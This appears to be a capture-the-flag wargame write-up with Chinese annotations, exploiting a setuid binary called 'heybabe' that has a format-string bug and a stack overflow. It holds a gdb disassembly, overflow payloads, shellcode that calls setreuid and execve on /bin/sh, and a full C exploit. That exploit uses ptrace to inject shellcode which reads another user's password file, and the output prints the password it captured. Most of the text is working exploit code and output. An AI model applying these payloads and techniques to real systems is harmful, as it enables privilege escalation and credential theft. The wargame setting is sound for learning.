

(gdb) disass main
Dump of assembler code for function main:
0x08048464 <main+0>:    lea    0x4(%esp),%ecx
0x08048468 <main+4>:    and    $0xfffffff0,%esp
0x0804846b <main+7>:    pushl  0xfffffffc(%ecx)   /* %ecx - 0x4 */
0x0804846e <main+10>:   push   %ebp
0x0804846f <main+11>:   mov    %esp,%ebp
0x08048471 <main+13>:   push   %edi
0x08048472 <main+14>:   push   %ecx
0x08048473 <main+15>:   sub    $0x410,%esp  /*0x410 = 1040 */
0x08048479 <main+21>:   mov    %ecx,0xfffffc04(%ebp)
0x0804847f <main+27>:   mov    0xfffffc04(%ebp),%eax
0x08048485 <main+33>:   cmpl   $0x2,(%eax)   /* %eax = &argc */
0x08048488 <main+36>:   je     0x80484b1 <main+77>

0x0804848a <main+38>:   mov    0xfffffc04(%ebp),%edx
0x08048490 <main+44>:   mov    0x4(%edx),%eax
0x08048493 <main+47>:   mov    (%eax),%eax
0x08048495 <main+49>:   mov    %eax,0x4(%esp)
0x08048499 <main+53>:   movl   $0x80486b8,(%esp)
0x080484a0 <main+60>:   call   0x8048374 <printf@plt>
0x080484a5 <main+65>:   movl   $0xffffffff,(%esp)
0x080484ac <main+72>:   call   0x8048384 <exit@plt>

0x080484b1 <main+77>:   movl   $0x0,0xc(%esp)
0x080484b9 <main+85>:   movl   $0x1,0x8(%esp)
0x080484c1 <main+93>:   movl   $0x0,0x4(%esp)
0x080484c9 <main+101>:  movl   $0x0,(%esp)
0x080484d0 <main+108>:  call   0x8048354 <ptrace@plt> /* ptrace(0,0,1,0) */
0x080484d5 <main+113>:  test   %eax,%eax
0x080484d7 <main+115>:  jns    0x80484f1 <main+141> /* ；利用ptrace来反调试 */
0x080484d9 <main+117>:  movl   $0x80486cc,(%esp)
0x080484e0 <main+124>:  call   0x8048344 <puts@plt>
0x080484e5 <main+129>:  movl   $0xffffffff,(%esp)
0x080484ec <main+136>:  call   0x8048384 <exit@plt>

0x080484f1 <main+141>:  mov    0xfffffc04(%ebp),%edi /* edi = argc = 2 */
0x080484f7 <main+147>:  mov    0x4(%edi),%eax
0x080484fa <main+150>:  add    $0x4,%eax
0x080484fd <main+153>:  mov    (%eax),%eax  /* eax = argv[1] */
0x080484ff <main+155>:  movl   $0x3e7,0x8(%esp) /* 3e7:999 */
0x08048507 <main+163>:  mov    %eax,0x4(%esp)
0x0804850b <main+167>:  lea    0xfffffc10(%ebp),%eax
0x08048511 <main+173>:  mov    %eax,(%esp)
0x08048514 <main+176>:  call   0x8048394 <strncpy@plt> /* strncpy(dest,argv[1],999)*/
0x08048519 <main+181>:  lea    0xfffffc10(%ebp),%eax /* dest */
0x0804851f <main+187>:  mov    $0xffffffff,%ecx /* ecx = -1 */
0x08048524 <main+192>:  mov    %eax,0xfffffc00(%ebp)
0x0804852a <main+198>:  mov    $0x0,%al
0x0804852c <main+200>:  cld    
0x0804852d <main+201>:  mov    0xfffffc00(%ebp),%edi 
/* 
1、 repnz scasb（32位地址操作）。扫描es:edi指向的一系列字节数据，扫描长度由ecx指定，
   当遇到与al中的数据相等时停止扫描。
2、最经典的求字符串长度的代码，strlen()在VC优化编译模式是这段代码。
3、得到的字符串最后存放在ecx中。
*/
0x08048533 <main+207>:  repnz scas %es:(%edi),%al
0x08048535 <main+209>:  mov    %ecx,%eax     
0x08048537 <main+211>:  not    %eax
0x08048539 <main+213>:  dec    %eax   /*求出dest的字符串长度，放到eax中 */
0x0804853a <main+214>:  inc    %eax   /* 字符串长度 +1 */
0x0804853b <main+215>:  movb   $0x0,0xfffffc10(%ebp,%eax,1) /* 字符串结尾处赋值为0 */
0x08048543 <main+223>:  movl   $0x24,0x4(%esp)  
0x0804854b <main+231>:  lea    0xfffffc10(%ebp),%eax
0x08048551 <main+237>:  mov    %eax,(%esp)
0x08048554 <main+240>:  call   0x8048334 <strchr@plt> /* char *strchr(char *str,char character) :从字符串str中寻找字符character第一次出现的位置*/
0x08048559 <main+245>:  test   %eax,%eax /* 若str中没有0x24("$"符号)，则下面将跳转 */
0x0804855b <main+247>:  je     0x8048575 <main+273>
0x0804855d <main+249>:  movl   $0x80486ec,(%esp)   /* "TOUGH SHIT!" */
0x08048564 <main+256>:  call   0x8048374 <printf@plt>
0x08048569 <main+261>:  movl   $0xffffffff,(%esp)
0x08048570 <main+268>:  call   0x8048384 <exit@plt>

0x08048575 <main+273>:  movl   $0x80486f8,(%esp) /* "Walk the way of the 1337 one!" */
0x0804857c <main+280>:  call   0x8048374 <printf@plt>
0x08048581 <main+285>:  lea    0xfffffc10(%ebp),%eax
0x08048587 <main+291>:  mov    %eax,(%esp)
0x0804858a <main+294>:  call   0x8048374 <printf@plt> /* 字符串格式化漏洞 */
0x0804858f <main+299>:  mov    $0x0,%eax
0x08048594 <main+304>:  add    $0x410,%esp
0x0804859a <main+310>:  pop    %ecx
0x0804859b <main+311>:  pop    %edi
0x0804859c <main+312>:  pop    %ebp
0x0804859d <main+313>:  lea    0xfffffffc(%ecx),%esp
0x080485a0 <main+316>:  ret    
0x080485a1 <main+317>:  nop    
0x080485a2 <main+318>:  nop    
0x080485a3 <main+319>:  nop    
0x080485a4 <main+320>:  nop    
0x080485a5 <main+321>:  nop    
0x080485a6 <main+322>:  nop    
0x080485a7 <main+323>:  nop    
0x080485a8 <main+324>:  nop    
0x080485a9 <main+325>:  nop    
0x080485aa <main+326>:  nop    
0x080485ab <main+327>:  nop    
0x080485ac <main+328>:  nop    
0x080485ad <main+329>:  nop    
0x080485ae <main+330>:  nop    
0x080485af <main+331>:  nop    
End of assembler dump.
(gdb) 

(gdb) r $(perl -e 'print "AAAA"."[%08x]"x(100)')
Starting program: /tmp/level7/heybabe $(perl -e 'print "AAAA"."[%08x]"x(100)')
AAAA[00000024][0000018b][00000000][0083ecd8]
[00000001][bfffd448][bfffd850][00000000][bfffd454]
[41414141][3830255b]

offset = 10


r $(perl -e 'print "A"x(2000)."B"x(1000)')

 r $(perl -e 'print "A"x(55730)')
 (gdb) c
Continuing.
Walk the way of the 1337 one!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...........
Breakpoint 4, 0x080485a0 in main ()
(gdb) x/x $esp
0xbffefffc:     0x41414141
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) 

r $(perl -e 'print "A"x(772)."B"x(4)."C"x(224)."C"x(54730)') 
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 

level7@blackbox:/tmp/level7$export PYALOAD=$'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
level7@blackbox:/tmp/level7$ /tmp/level7/getenv12 PAYLOAD
PAYLOAD is at 0xbfffdfad

level7@blackbox:/tmp/level7$ ./exploit $(perl -e 'print "A"x(772)."\xad\xdf\xff\xbf"."C"x(224)."C"x(54730)')
Father process: child process pid = 9998
Walk the way of the 1337 one!AAAAAAAAAAAAAAA.......
CCCCCCCCCCCCCCCCCCtmp.esp = bfff0114,child will exit,write shellcode
n0s3crets
child exited
level7@blackbox:/tmp/level7$ 


exploit.c 

#include <sys/ptrace.h>
#include <sys/fcntl.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>


const int long_size = sizeof(long);
void traphdl(int s) {
  printf("TRAP caught.\n");
}
void childhdl(int s)
{
//   printf("SIGCHILD caught\n");
}
void getdata(pid_t child, long addr,
             char *str, int len)
{
    char *laddr;
    int i, j;
    union u
    {
        long val;
        char chars[long_size];
    }data;

    i = 0;
    j = len / long_size;
    laddr = str;

    while(i < j)
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
        memcpy(laddr, data.chars, long_size);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if(j != 0)
    {
        data.val = ptrace(PTRACE_PEEKDATA, child, addr + i * 4, NULL);
        memcpy(laddr, data.chars, j);
    }
    str[len] = '\0';
}

void putdata(pid_t child, long addr, char *str, int len)
{
    char *laddr;
    int i, j;
    union u
    {
        long val;
        char chars[long_size];
    }data;

    i = 0;
    j = len / long_size;
    laddr = str;
    while(i < j)
    {
        memcpy(data.chars, laddr, long_size);
        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
        ++i;
        laddr += long_size;
    }
    j = len % long_size;
    if(j != 0)
    {
        memcpy(data.chars, laddr, j);
        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);
    }
}


int main(int argc, char **argv, char **environ) {
  int f;
  char parameter[500]={0};
  char bak[1000] ={0};
  char shellcode[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x83\xec\x14\xeb\x32\x5b\xb0\x05\
x31\xc9\xcd"
"\x80\x89\xc6\xeb\x06\xb0\x01\x31"
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83"
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd"
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0"
"\x04\xb3\x01\xb2\x01\xcd\x80\x83"
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff"
"\xff"
"/home/level8/password\x00";
  int sc_length = sizeof(shellcode);
 // strncpy(parameter, argv[1], sizeof(parameter));
  signal(SIGTRAP, traphdl);
  signal(SIGCHLD, childhdl);
  f = fork();
  if (f == 0) {
    char *X[3] = { "/home/level7/heybabe", argv[1], NULL };
    //ptrace(PTRACE_TRACEME, 0, NULL, NULL);
    int ret = execve(X[0], X, environ);
    if(ret == -1)
        perror("execve");
    return 255;
  }
  else if (f > 0)
  {
     int pid = 0;
     int status;
     printf("Father process: child process pid = %d\n", f);
     int mark = 0;
     while (pid == 0 || errno != ECHILD) {
         pid = wait(&status);
         if(WIFEXITED(status))
         {
             printf("child exited\n");
             return 0;
         }
      if (pid == f && WIFSTOPPED(status)) {
        struct user_regs_struct U;
        memset(&U, 0, sizeof(U));
        errno = 0;
        int ret = ptrace(PTRACE_GETREGS, f, 0, &U);
        if (ret < 0)
        {
           printf("errno = %d",errno);
           perror(errno);
           return 1;
        }
      // printf("SYSCALL=%d\nEIP=%p; EBP=%p;ESP=%p;ESI=%d;EDI=%d;EAX=%d;EBX=%d;ECX=%d;EDX=%d\n",U.orig_eax, U.eip, U.ebp, U.esp, U.esi, U.edi, U.eax, U.ebx,U.ecx,U.edx);
        if (mark == 0)
        {
           struct user_regs_struct tmp = U;
           /* 重点： 利用ebp来设置正确的esp*/
           tmp.esp = tmp.ebp - 20;
           printf("tmp.esp = %x,child will exit,write shellcode\n", tmp.esp);
           getdata(f, U.eip, bak,sc_length - 1);
           putdata(f, U.eip, shellcode, sc_length - 1);
           ptrace(PTRACE_SETREGS, f, NULL, &tmp);
           mark++;
        }
        ptrace(PTRACE_SYSCALL, f, NULL, NULL);
        //printf("***********************************\n");
     }
       }
  return 0;
}
}
